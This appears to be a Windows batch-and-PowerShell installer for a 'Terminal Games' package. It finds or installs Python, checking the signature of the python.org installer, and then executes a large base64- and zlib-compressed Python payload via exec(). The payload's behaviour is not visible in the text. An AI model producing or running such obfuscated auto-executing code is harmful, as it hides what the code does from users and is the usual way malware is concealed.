@echo off
setlocal
title Terminal Games Installer
set "TG_INSTALLER_SELF=%~f0"
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$text=[IO.File]::ReadAllText($env:TG_INSTALLER_SELF); $body=($text -split '(?m)^::TG_POWERSHELL_START\r?$',2)[1]; & ([scriptblock]::Create($body))"
if "%errorlevel%"=="76" exit
if errorlevel 1 pause
exit /b
::TG_POWERSHELL_START
$ErrorActionPreference = 'Stop'
function Find-Python {
    $candidates = @()
    $py = Get-Command py.exe -ErrorAction SilentlyContinue
    if ($py) {
        try {
        $found = & $py.Source -3 -c "import sys; assert sys.version_info >= (3,9); print(sys.executable)" 2>$null
        if ($LASTEXITCODE -eq 0 -and $found) { return [string]($found | Select-Object -Last 1) }
        } catch {}
    }
    $candidates += Join-Path $env:LOCALAPPDATA 'Programs\Python\Python313\python.exe'
    $command = Get-Command python.exe -ErrorAction SilentlyContinue
    if ($command -and $command.Source -notlike '*\WindowsApps\*') { $candidates += $command.Source }
    foreach ($candidate in $candidates) {
        if (Test-Path $candidate) {
            & $candidate -c "import sys; assert sys.version_info >= (3,9)" 2>$null
            if ($LASTEXITCODE -eq 0) { return $candidate }
        }
    }
    return $null
}
try {
    $python = Find-Python
    if (-not $python) {
        Write-Host 'Python is missing. Downloading the official installer...'
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $architecture = $env:PROCESSOR_ARCHITECTURE
        if ($env:PROCESSOR_ARCHITEW6432) { $architecture = $env:PROCESSOR_ARCHITEW6432 }
        $suffix = switch ($architecture) { 'ARM64' {'-arm64'} 'AMD64' {'-amd64'} default {''} }
        $temporary = Join-Path ([IO.Path]::GetTempPath()) ('terminal-games-' + [guid]::NewGuid())
        New-Item -ItemType Directory -Path $temporary | Out-Null
        try {
            $installer = Join-Path $temporary 'python-installer.exe'
            Invoke-WebRequest -UseBasicParsing -Uri "https://www.python.org/ftp/python/3.13.17/python-3.13.17$suffix.exe" -OutFile $installer
            $signature = Get-AuthenticodeSignature $installer
            if ($signature.Status -ne 'Valid' -or $signature.SignerCertificate.Subject -notmatch 'Python Software Foundation') { throw 'Python installer signature check failed.' }
            Write-Host 'Installing Python for your Windows account...'
            $process = Start-Process -FilePath $installer -ArgumentList '/passive InstallAllUsers=0 PrependPath=1 Include_test=0 Include_launcher=0' -Wait -PassThru
            if ($process.ExitCode -notin @(0,3010)) { throw "Python installation failed (code $($process.ExitCode))." }
        } finally { Remove-Item -LiteralPath $temporary -Recurse -Force -ErrorAction SilentlyContinue }
        $python = Find-Python
        if (-not $python) { throw 'Python could not be found after installation. Restart Windows and try START HERE again.' }
    }
    & $python -c "import base64,zlib;exec(compile(zlib.decompress(base64.b64decode('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')),'<Terminal Games installer>','exec'))"
    exit $LASTEXITCODE
} catch {
    Write-Host ('Installation failed: ' + $_.Exception.Message) -ForegroundColor Red
    exit 1
}
